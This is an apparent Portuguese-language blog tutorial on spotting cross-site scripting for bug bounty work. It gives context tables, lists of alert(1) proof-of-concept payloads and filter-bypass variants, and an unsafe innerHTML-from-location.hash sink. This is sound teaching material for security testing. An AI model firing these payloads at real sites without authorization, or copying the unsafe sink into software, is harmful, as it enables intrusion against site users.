---
title: "Como identificar uma vulnerabilidade de XSS (Cross-Site Scripting)"
date: 2025-06-10 18:00:00 -0300
categories: segurança-web
tags: ["xss", "bug bounty", "seguranca-web", "hacking"]
---

<div style="max-width: 100%; text-align: center; margin: 2rem 0;">
  <img src="/assets/img/como-identificar-xss/banner.gif" 
       alt="Banner sobre Engenharia Social" 
       style="width: 100%; max-width: 1200px; height: auto; border-radius: 8px;" />
</div>

**XSS (Cross-Site Scripting)** é uma das vulnerabilidades mais comuns e mais exploradas da web. E também uma das primeiras que a galera costuma encontrar em Bug Bounty.  
Se liga nesse guia completo pra identificar XSS na prática — mesmo que você esteja começando agora.

---

## 🧠 O que é um XSS?

É quando um atacante consegue **injetar código JavaScript malicioso** dentro de uma página, que será executado no navegador da vítima.  
Com isso, dá pra:

- Roubar cookies e tokens
- Redirecionar usuários pra phishing
- Capturar dados de formulários
- Explorar outras falhas do app pelo navegador

---

## 🧪 Tipos de XSS

1. **Refletido**  
   O payload é refletido direto na resposta da requisição (ex: na URL).
2. **Armazenado**  
   O payload fica salvo no banco de dados e aparece para outros usuários.
3. **DOM-Based**  
   A injeção acontece no lado do cliente, quando o JavaScript da página manipula valores da URL, `document.location`, `innerHTML`, etc.

---

## 🔍 Como identificar um XSS

### Passo 1 – Onde seu input aparece?

Testa campos como:

- Formulários de busca
- Comentários
- Parâmetros da URL (ex: `?q=teste`)
- Inputs escondidos ou debug tools no front
- Qualquer coisa que reflita dados no HTML

Use valores como:

```
xss123
<script>1</script>
"><img src=x onerror=alert(1)>
```

Procure onde isso aparece na resposta: no corpo da página, em atributos, no JavaScript, etc.

---

### Passo 2 – Qual o contexto?

O contexto onde o valor aparece muda **como** você deve injetar. Exemplos:

| Contexto | Exemplo na resposta | Payload básico |
|---------|---------------------|----------------|
| HTML    | `<div>xss123</div>` | `<script>alert(1)</script>` |
| Atributo| `<input value="xss123">` | `" onfocus=alert(1) autofocus="` |
| JS      | `var data = "xss123";` | `";alert(1);//` |
| URL     | `<a href="?msg=xss123">` | `javascript:alert(1)` |

---

### Passo 3 – Teste com payloads

Comece com os mais simples:

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)"></iframe>
```

Se nada funcionar, tenta versões obfuscadas:

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<scr ipt>alert(1)</scr ipt>
<svg><script>alert(1)</script></svg>
```

---

## 🛠 Ferramentas úteis

- **Burp Suite** – Intercepta e altera requisições
- **XSStrike** – Fuzzer inteligente para XSS
- **Google Chrome DevTools** – Pra ver o DOM renderizado
- **xsshunter.com** – Pra detectar execuções automáticas (armazenado ou DOM-based)

---

## 🎯 Exemplos reais de XSS

### Refletido:
```
https://site.com/search?q=<script>alert(1)</script>
```

### Armazenado:
Campo de comentário:
```html
Ótimo post! <script>alert('XSS')</script>
```
Se o admin abrir a página de comentários e o JS rodar → bingo.

### DOM-Based:
URL:
```
https://site.com/#<img src=x onerror=alert(1)>
```
Se o JS do site fizer algo como:
```js
document.body.innerHTML = location.hash;
```
➡ Isso é perigoso.

---

## 🧩 Bônus: bypasses comuns

Às vezes o site bloqueia `<script>`. Tenta alternativas:

```html
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<input onfocus=alert(1) autofocus>
<iframe srcdoc="<script>alert(1)</script>">
```

E em JS:
```js
'";alert(1);// 
</script><script>alert(1)</script>
```

---

## 🛡 Como saber se é de verdade?

Um XSS só é válido quando **o código malicioso é executado de fato**, e:

- Afeta outro usuário (armazenado)
- Pode ser explorado via link (refletido)
- Roda no navegador sem interação do usuário (auto-execução)

Não basta "ver o payload na tela" — tem que rodar.

---

## 📌 Checklist rápido pra identificar um XSS

- [ ] O input é refletido na resposta?
- [ ] Qual o contexto HTML? (tag, atributo, JS, etc.)
- [ ] O payload executa código?
- [ ] O filtro é fraco? Dá pra bypassar?
- [ ] Outro usuário seria afetado?

---

## 🧠 Conclusão

XSS parece simples, mas é uma das falhas mais versáteis e perigosas.  
Com prática, você aprende a **ler o DOM com olhos de atacante** e a escapar de filtros comuns.

Testa em labs, vê como os apps tratam entrada, e abusa do DevTools pra entender como tudo é construído.

Se você achou esse guia útil, compartilha.  
Se quiser um desafio XSS real, posso te mandar um lab ou quiz!

---

> “XSS é a arte de falar JavaScript com sotaque de atacante.”  
> — lxr0x64
